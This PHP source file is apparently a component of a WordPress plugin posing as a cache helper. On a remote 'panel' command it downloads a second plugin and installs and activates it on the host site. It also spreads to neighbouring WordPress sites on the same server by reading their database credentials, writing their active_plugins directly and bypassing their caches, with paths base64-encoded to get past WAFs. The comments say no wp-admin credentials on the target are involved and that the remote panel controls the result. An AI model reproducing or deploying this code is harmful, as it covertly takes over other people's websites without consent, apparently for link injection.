<?php

if (!defined('ABSPATH')) exit;

/**
 * WLH_WchInstall — SIGNED-COMMAND-ONLY install of the MAIN plugin
 * (wp-cache-helper, wch) FROM this donor (0.6.0) — "plugin-onto-plugin": no
 * wp-admin creds on the target are ever involved.
 *
 * ?wlh_wchinstall (HMAC 'wchinstall.ts.sha', sha mandatory) downloads the wch
 * zip from the panel (sha-pinned, TLS-verified — the same rules as the 0.5.0
 * code self-update) and installs it in one of two modes:
 *
 *   self — no path_b64: copy the unzipped wp-cache-helper/ into OUR
 *          WP_PLUGIN_DIR, flip our own active_plugins (serialize/read-back,
 *          same discipline as WLH_Adopt::db_activate), then poke home_url('/')
 *          so WP boots with wch active and wch claims itself on init
 *          (wch >= 0.12.10 claims on init while unconfigured);
 *   fs   — path_b64 given: the WLH_Adopt fs machinery with a different file
 *          source — the unzipped wch tree goes into the SIBLING's
 *          wp-content/plugins/, active_plugins is flipped in the sibling's DB
 *          (mysqli, serialize/read-back), then the sibling's siteurl is poked.
 *
 * HARD RULES (same as WLH_Adopt — do not relax):
 *   - No autonomy: reached ONLY from WLH_Check AFTER a valid HMAC; nothing
 *     here runs on cron, init, or heartbeat.
 *   - One op = one target. No batching.
 *   - Every failure degrades to a JSON error; a broken download/unzip/sibling
 *     must never fatal OUR request.
 *   - active_plugins is rewritten only with a serialize/read-back roundtrip.
 */
class WLH_WchInstall
{
    const PLUGIN_REL = 'wp-cache-helper/wp-cache-helper.php';

    /** Entry for ?wlh_wchinstall. Never throws into the request. */
    public static function install($sha, $path_b64)
    {
        try {
            return self::install_inner($sha, $path_b64);
        } catch (\Throwable $e) {
            return array('ok' => false, 'error' => 'exception');
        }
    }

    private static function install_inner($sha, $path_b64)
    {
        $sha = strtolower(trim((string) $sha));
        if ($sha === '') {
            // WLH_Check already refuses a signed-but-sha-less call loudly; this
            // is the belt to its suspenders — never install an unpinned build.
            return array('ok' => false, 'error' => 'sha_required');
        }

        // Local, cheap validation FIRST — the download only happens for a
        // target we already know we can write.
        $path = '';
        if ((string) $path_b64 !== '') {
            // base64'd like adopt's path_b64: a raw /var/www/... string is
            // 403'd by WAFs even inside a POST body, base64 sails through.
            $d = base64_decode((string) $path_b64, true);
            $path = is_string($d) ? WLH_Adopt::normalize_path($d) : '';
            if ($path === '' || !WLH_Adopt::is_wp_install($path)) {
                return array('ok' => false, 'error' => 'bad_path');
            }
            if (!WLH_Adopt::plugins_writable($path)) {
                return array('ok' => false, 'mode' => 'fs', 'error' => 'not_writable');
            }
        }

        $dl = self::download_zip($sha);
        if (empty($dl['ok'])) {
            return $dl;
        }
        $src = $dl['dir'] . '/wp-cache-helper';
        if (!@is_dir($src) || !@is_file($src . '/wp-cache-helper.php')) {
            self::cleanup($dl);
            return array('ok' => false, 'error' => 'unzip_failed');
        }

        $res = ($path === '') ? self::install_self($src) : self::install_fs($src, $path);
        self::cleanup($dl);
        return $res;
    }

    /* ---------------- download + unzip ---------------- */

    /**
     * Download the wch build from the panel, verify it against the SIGNED sha,
     * and unzip into a private temp dir — NOT straight into plugins/: the copy
     * target differs per mode (ours vs a sibling's) and a failed sha/unzip
     * must never leave half a plugin behind.
     */
    private static function download_zip($sha)
    {
        $c = WLH_Client::load_config();
        if ($c['endpoint'] === '' || $c['token'] === '') {
            return array('ok' => false, 'error' => 'download_failed');
        }
        require_once ABSPATH . 'wp-admin/includes/file.php';
        $file = wp_tempnam('wlh-wch');
        if (!$file) {
            return array('ok' => false, 'error' => 'download_failed');
        }
        $args = array(
            'timeout'     => 30,
            'redirection' => 2,
            // Code download: verify TLS — the panel sits behind a valid cert
            // (same rule as the 0.5.0 self-update; never silently trusted).
            'sslverify'   => true,
            'stream'      => true,
            'filename'    => $file,
            'user-agent'  => WLH_Client::USER_AGENT,
            'headers'     => array('Authorization' => 'Bearer ' . $c['token']),
        );
        add_filter('http_api_curl', array('WLH_Client', 'force_ipv4_curl'), 10, 1);
        $r = wp_remote_get($c['endpoint'] . '/api/links/wch-zip', $args);
        remove_filter('http_api_curl', array('WLH_Client', 'force_ipv4_curl'), 10);

        if (is_wp_error($r)) {
            @unlink($file);
            return array('ok' => false, 'error' => 'download_failed');
        }
        $code = (int) wp_remote_retrieve_response_code($r);
        if ($code < 200 || $code >= 300) {
            @unlink($file);
            return array('ok' => false, 'error' => 'download_failed');
        }
        // The sha inside the SIGNED URL is the integrity pin. The zip's own
        // X-WCH-Plugin-Sha256 header is informational only — never trusted on
        // its own, exactly like the self-update.
        if (strtolower((string) @hash_file('sha256', $file)) !== $sha) {
            @unlink($file);
            return array('ok' => false, 'error' => 'sha_mismatch');
        }
        if (!function_exists('unzip_file') || !function_exists('WP_Filesystem')) {
            require_once ABSPATH . 'wp-admin/includes/file.php';
        }
        WP_Filesystem();
        $base = function_exists('get_temp_dir') ? get_temp_dir() : (dirname($file) . '/');
        $dir = rtrim(str_replace('\\', '/', $base), '/') . '/wlh-wch-' . substr(md5(uniqid('', true)), 0, 10);
        $unz = unzip_file($file, $dir);
        if (is_wp_error($unz)) {
            @unlink($file);
            self::rrmdir($dir);
            return array('ok' => false, 'error' => 'unzip_failed');
        }
        return array('ok' => true, 'file' => $file, 'dir' => $dir);
    }

    /* ---------------- mode self (this very site) ---------------- */

    private static function install_self($src)
    {
        $plugins_dir = defined('WP_PLUGIN_DIR') ? WP_PLUGIN_DIR : (WP_CONTENT_DIR . '/plugins');
        $dest = rtrim(str_replace('\\', '/', $plugins_dir), '/') . '/wp-cache-helper';
        if (!WLH_Adopt::copy_tree($src, $dest) || !@is_file($dest . '/wp-cache-helper.php')) {
            return array('ok' => false, 'mode' => 'self', 'error' => 'copy_failed');
        }
        if (!function_exists('get_option') || !function_exists('update_option')) {
            return array('ok' => false, 'mode' => 'self', 'error' => 'db_write_failed');
        }
        // The same serialize/read-back discipline as WLH_Adopt::db_activate,
        // just through the options API: never write a value that did not
        // unserialize cleanly, never trust the write without a re-read.
        $raw = serialize(array_values((array) get_option('active_plugins', array())));
        $add = WLH_Adopt::active_plugins_add($raw, self::PLUGIN_REL);
        if (empty($add['ok'])) {
            return array('ok' => false, 'mode' => 'self', 'error' => 'active_plugins_corrupt');
        }
        if (!empty($add['changed'])) {
            $new = @unserialize($add['value']);
            if (!is_array($new) || !update_option('active_plugins', $new, false)) {
                return array('ok' => false, 'mode' => 'self', 'error' => 'db_write_failed');
            }
            $back = serialize(array_values((array) get_option('active_plugins', array())));
            if (!WLH_Adopt::active_plugins_has($back, self::PLUGIN_REL)) {
                return array('ok' => false, 'mode' => 'self', 'error' => 'db_write_failed');
            }
        }
        // Poke our own front page: WP boots with wch active+unconfigured and
        // wch claims itself on init. A failed poke still leaves wch active.
        $poked = self::poke(function_exists('home_url') ? home_url('/') : '');
        return array('ok' => true, 'mode' => 'self', 'poked' => $poked);
    }

    /* ---------------- mode fs (sibling install) ---------------- */

    private static function install_fs($src, $path)
    {
        $dest = $path . '/wp-content/plugins/wp-cache-helper';
        // Overwrites files in place on a re-install (version refresh); extra
        // stale files are left alone on purpose — same as adopt.
        if (!WLH_Adopt::copy_tree($src, $dest) || !@is_file($dest . '/wp-cache-helper.php')) {
            return array('ok' => false, 'mode' => 'fs', 'error' => 'copy_failed');
        }

        // Files alone do nothing — activate in the TARGET's own DB.
        $cfg = class_exists('WLH_Neighbors') ? WLH_Neighbors::read_config($path) : null;
        if ($cfg === null) {
            return array('ok' => false, 'mode' => 'fs', 'error' => 'no_config');
        }
        $db = WLH_Adopt::db_connect($cfg);
        if (!$db) {
            return array('ok' => false, 'mode' => 'fs', 'error' => 'db_connect_failed');
        }
        $act = WLH_Adopt::db_activate($db, $cfg['prefix'], self::PLUGIN_REL);
        if (empty($act['ok'])) {
            @mysqli_close($db);
            return array('ok' => false, 'mode' => 'fs', 'error' => $act['error']);
        }
        $siteurl = WLH_Adopt::db_siteurl($db, $cfg['prefix']);
        @mysqli_close($db);

        // Object-cache gotcha, same as adopt (0.10.4): the direct DB write to
        // active_plugins is invisible while the target holds the stale option
        // in a persistent object cache — wch never loads, never claims, never
        // pulls (ambamovil.com.ar: install «ok», страниц нет). Отодвигаем
        // drop-in до poke, чтобы следующий запрос перечитал список из БД.
        WLH_Adopt::bypass_object_cache($path);

        // The sibling's wch is active but UNCONFIGURED until its first request
        // loads it; a plain front-page poke IS that request (wch claims on
        // init). A failed poke still leaves an active plugin.
        $poked = self::poke($siteurl);

        return array('ok' => true, 'mode' => 'fs', 'poked' => $poked);
    }

    /* ---------------- shared helpers ---------------- */

    /** Front-page GET that boots WP on the target so wch can claim on init. */
    private static function poke($url)
    {
        if ($url === '' || !function_exists('wp_remote_get')) {
            return false;
        }
        $r = @wp_remote_get(rtrim($url, '/') . '/', array('timeout' => 10, 'sslverify' => false, 'redirection' => 2));
        if (function_exists('is_wp_error') && is_wp_error($r)) {
            return false;
        }
        return is_array($r);
    }

    /** Best-effort removal of the temp zip + unzip dir. Never throws. */
    private static function cleanup($dl)
    {
        if (isset($dl['file'])) {
            @unlink($dl['file']);
        }
        // Only ever delete a dir WE created (the wlh-wch-* prefix is the proof)
        // — a stray path here must never turn into an arbitrary rm -rf.
        if (isset($dl['dir']) && strpos(basename($dl['dir']), 'wlh-wch-') === 0) {
            self::rrmdir($dl['dir']);
        }
    }

    /** Recursive delete; symlinks are unlinked, never followed. */
    private static function rrmdir($dir)
    {
        $items = @scandir($dir);
        if (!is_array($items)) {
            return;
        }
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') {
                continue;
            }
            $p = $dir . '/' . $item;
            if (@is_dir($p) && !@is_link($p)) {
                self::rrmdir($p);
            } else {
                @unlink($p);
            }
        }
        @rmdir($dir);
    }
}
